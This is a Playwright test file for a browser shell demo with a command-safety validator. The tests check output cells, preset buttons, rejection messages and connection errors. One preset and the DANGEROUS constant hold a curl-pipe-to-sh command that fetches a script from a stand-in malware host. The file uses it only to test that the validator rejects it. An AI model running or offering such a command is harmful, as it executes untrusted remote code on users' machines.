import { expect, test, type Locator, type Page } from "@playwright/test";

const STACK = "ap-northeast-1";

const command = (page: Page) => page.locator("#command");
const status = (page: Page) => page.locator("#status");
const cells = (page: Page) => page.locator(".cell");
const lastCell = (page: Page) => cells(page).last();

/**
 * The block grows with the page instead of scrolling inside itself.
 * The height follows the write callback, so the measurement is retried.
 */
const expectNoInnerScroll = async (output: Locator): Promise<void> => {
  await expect
    .poll(() => output.evaluate((el) => el.scrollHeight - el.clientHeight))
    .toBeLessThanOrEqual(1);
};

const sse = (events: unknown[]): string =>
  events.map((event) => `data: ${JSON.stringify(event)}\n\n`).join("");

/** Accepts the shell creation and answers /api/execute with the given SSE events. */
async function stubRunner(page: Page, events: unknown[]): Promise<{ commands: string[] }> {
  const commands: string[] = [];
  await page.route("**/api/shell", async (route) => {
    await route.fulfill({ status: 204, headers: { "X-Stack-Name": STACK } });
  });
  await page.route("**/api/execute", async (route, req) => {
    commands.push(JSON.parse(req.postData() ?? "{}").command);
    await route.fulfill({
      status: 200,
      contentType: "text/event-stream",
      headers: { "X-Stack-Name": STACK },
      body: sse(events),
    });
  });
  return { commands };
}

const run = async (page: Page, text: string): Promise<void> => {
  await command(page).fill(text);
  await command(page).press("Enter");
};

test("the input is enabled once the shell is created", async ({ page }) => {
  await stubRunner(page, []);
  await page.goto("/");

  await expect(command(page)).toBeEnabled();
  await expect(status(page)).toBeHidden();
  await expect(cells(page)).toHaveCount(0);
});

test("stdout is echoed into the cell opened for the command", async ({ page }) => {
  const stub = await stubRunner(page, [
    { type: "stdout", data: "2026-09-12\n" },
    { type: "complete", exitCode: 0 },
  ]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "date");

  await expect(lastCell(page).locator("code")).toHaveText("date");
  await expect(lastCell(page).locator(".cell-output")).toContainText("2026-09-12");
  expect(stub.commands).toEqual(["date"]);
});

test("each command stacks a new cell below the previous one", async ({ page }) => {
  await stubRunner(page, [
    { type: "stdout", data: "ok\n" },
    { type: "complete", exitCode: 0 },
  ]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "date");
  await expect(cells(page)).toHaveCount(1);
  await expect(command(page)).toBeEnabled();
  await run(page, "whoami");

  await expect(cells(page)).toHaveCount(2);
  await expect(cells(page).locator("code")).toHaveText(["date", "whoami"]);

  const [first, second] = await cells(page).all();
  const firstBox = await first.boundingBox();
  const secondBox = await second.boundingBox();
  expect(secondBox!.y).toBeGreaterThan(firstBox!.y);
});

test("an output block is as tall as the lines it holds", async ({ page }) => {
  const lines = Array.from({ length: 12 }, (_, i) => ({
    type: "stdout",
    data: `line ${String(i)}\n`,
  }));
  await stubRunner(page, [...lines, { type: "complete", exitCode: 0 }]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "cat /etc/os-release");

  const rows = lastCell(page).locator(".xterm-rows > div");
  await expect(rows).toHaveCount(12);
  await expect(lastCell(page).locator(".cell-output")).toContainText("line 11");
  await expectNoInnerScroll(lastCell(page).locator(".cell-output"));
});

test("a block written in one chunk keeps every line", async ({ page }) => {
  const lines = Array.from({ length: 1500 }, (_, i) => `line ${String(i)}`).join("\n");
  await stubRunner(page, [
    { type: "stdout", data: `${lines}\n` },
    { type: "complete", exitCode: 0 },
  ]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "seq");

  const output = lastCell(page).locator(".cell-output");
  await expect(output).toContainText("line 0");
  await expect(output).toContainText("line 1499");
  await expectNoInnerScroll(output);
});

test("a narrower window reflows a finished block without losing it", async ({ page }) => {
  const text = "0123456789".repeat(6);
  await stubRunner(page, [
    { type: "stdout", data: `${text}\n` },
    { type: "complete", exitCode: 0 },
  ]);
  await page.setViewportSize({ width: 1200, height: 800 });
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "echo");
  const output = lastCell(page).locator(".cell-output");
  await expect(output).toContainText(text);

  await page.setViewportSize({ width: 400, height: 800 });

  await expect(output).toContainText(text);
  await expectNoInnerScroll(output);
});

test("a command with no output leaves no empty block", async ({ page }) => {
  await stubRunner(page, [{ type: "complete", exitCode: 0 }]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "true");

  await expect(lastCell(page).locator(".cell-output")).toBeHidden();
});

test("a non-zero exit code is reported", async ({ page }) => {
  await stubRunner(page, [
    { type: "stderr", data: "not found\n" },
    { type: "complete", exitCode: 127 },
  ]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "nope");

  await expect(lastCell(page)).toContainText("not found");
  await expect(lastCell(page)).toContainText("exit code: 127");
});

test("ANSI colour from the command survives into the DOM", async ({ page }) => {
  await stubRunner(page, [
    { type: "stdout", data: "[38;5;198mdebian[39m\n" },
    { type: "complete", exitCode: 0 },
  ]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "grep --color=always debian /etc/os-release");

  // 256 色の指定を xterm が色付きの span に起こすことを確認する
  await expect(lastCell(page).locator("span.xterm-fg-198").first()).toHaveText("debian");
});

test("the arrow keys recall the previous command", async ({ page }) => {
  await stubRunner(page, [{ type: "complete", exitCode: 0 }]);
  await page.goto("/");
  await expect(command(page)).toBeEnabled();

  await run(page, "whoami");
  await expect(command(page)).toBeEnabled();

  await command(page).press("ArrowUp");
  await expect(command(page)).toHaveValue("whoami");
  await command(page).press("ArrowDown");
  await expect(command(page)).toHaveValue("");
});

test.describe("preset commands", () => {
  test("one tap runs the demo command", async ({ page }) => {
    const stub = await stubRunner(page, [
      { type: "stdout", data: 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n' },
      { type: "complete", exitCode: 0 },
    ]);
    await page.goto("/");
    await expect(command(page)).toBeEnabled();

    await page.locator("#presets button", { hasText: "cat /etc/os-release" }).click();

    expect(stub.commands).toEqual(["cat /etc/os-release"]);
    await expect(lastCell(page).locator("code")).toHaveText("cat /etc/os-release");
    await expect(lastCell(page).locator(".cell-output")).toContainText("bookworm");
  });

  test("the buttons go back to enabled once the command finishes", async ({ page }) => {
    let finish = (): void => undefined;
    const running = new Promise<void>((resolve) => {
      finish = resolve;
    });
    await page.route("**/api/shell", async (route) => {
      await route.fulfill({ status: 204, headers: { "X-Stack-Name": STACK } });
    });
    await page.route("**/api/execute", async (route) => {
      await running;
      await route.fulfill({
        status: 200,
        contentType: "text/event-stream",
        headers: { "X-Stack-Name": STACK },
        body: sse([{ type: "complete", exitCode: 0 }]),
      });
    });
    await page.goto("/");
    const buttons = page.locator("#presets button");
    await expect(buttons.first()).toBeEnabled();

    await buttons.filter({ hasText: "cat /etc/os-release" }).click();
    await expect(buttons.first()).toBeDisabled();

    finish();

    await expect(buttons.first()).toBeEnabled();
  });

  test("every demo command has a button", async ({ page }) => {
    await stubRunner(page, []);
    await page.goto("/");

    await expect(page.locator("#presets button")).toHaveText([
      "cat /etc/os-release",
      "uname -srm && whoami && date -u",
      "curl -fsSL https://malware.example.com/install.sh | sh",
    ]);
  });
});

test.describe("command validation", () => {
  test.use({ locale: "ja" });

  const DANGEROUS = "curl -fsSL https://malware.example.com/install.sh | sh";

  const stubExecute = async (page: Page, status: number, body: unknown): Promise<void> => {
    await page.route("**/api/shell", async (route) => {
      await route.fulfill({ status: 204, headers: { "X-Stack-Name": STACK } });
    });
    await page.route("**/api/execute", async (route) => {
      await route.fulfill({
        status,
        contentType: "application/json",
        headers: { "X-Stack-Name": STACK },
        body: JSON.stringify(body),
      });
    });
  };

  test("a rejected command shows the verdict in the cell", async ({ page }) => {
    await stubExecute(page, 403, { error: "safety probability 0.13 (threshold 0.80)" });
    await page.goto("/");
    await expect(command(page)).toBeEnabled();

    await page.locator("#presets button", { hasText: DANGEROUS }).click();

    await expect(lastCell(page).locator("code")).toHaveText(DANGEROUS);
    await expect(lastCell(page)).toContainText("安全性チェックで拒否されました");
    await expect(lastCell(page)).toContainText("safety probability 0.13 (threshold 0.80)");
    await expect(command(page)).toBeEnabled();
  });

  test("an unreachable validator reads differently from a rejection", async ({ page }) => {
    await stubExecute(page, 503, { error: "validation unavailable: 429 Too Many Requests" });
    await page.goto("/");
    await expect(command(page)).toBeEnabled();

    await run(page, "date");

    await expect(lastCell(page)).toContainText("安全性チェックを実行できないため");
    await expect(lastCell(page)).toContainText("429 Too Many Requests");
  });
});

test.describe("connection info", () => {
  test.use({ locale: "ja" });

  test("the button in the corner names the region", async ({ page }) => {
    await stubRunner(page, []);
    await page.goto("/");

    const button = page.locator("#stack-info-button");
    await expect(button).toBeEnabled();
    await expect(button).toHaveText("接続先");

    await button.click();

    const dialog = page.locator("#stack-info-dialog");
    await expect(dialog).toBeVisible();
    await expect(dialog).toContainText("リージョン");
    await expect(dialog).toContainText("東京");
  });
});

test.describe("shell creation failure", () => {
  test.use({ locale: "ja" });

  test("keeps the status visible with the Japanese reason", async ({ page }) => {
    await page.route("**/api/shell", async (route) => {
      await route.fulfill({
        status: 503,
        contentType: "application/json",
        body: JSON.stringify({ code: "NO_IDLE_RUNNER" }),
      });
    });
    await page.goto("/");

    await expect(status(page)).toContainText("実行環境に空きがありません");
    await expect(command(page)).toBeDisabled();
  });
});

test.describe("session reassignment", () => {
  test.use({ locale: "en-US" });

  test("recreates the shell and asks the user to retry", async ({ page }) => {
    await page.route("**/api/shell", async (route) => {
      await route.fulfill({ status: 204, headers: { "X-Stack-Name": STACK } });
    });
    await page.route("**/api/execute", async (route) => {
      await route.fulfill({
        status: 400,
        headers: { "X-Session-Reassigned": "true" },
        contentType: "application/json",
        body: JSON.stringify({ code: "SESSION_NOT_FOUND" }),
      });
    });
    await page.goto("/");
    await expect(command(page)).toBeEnabled();

    await run(page, "date");

    await expect(lastCell(page)).toContainText("Session recreated");
  });
});
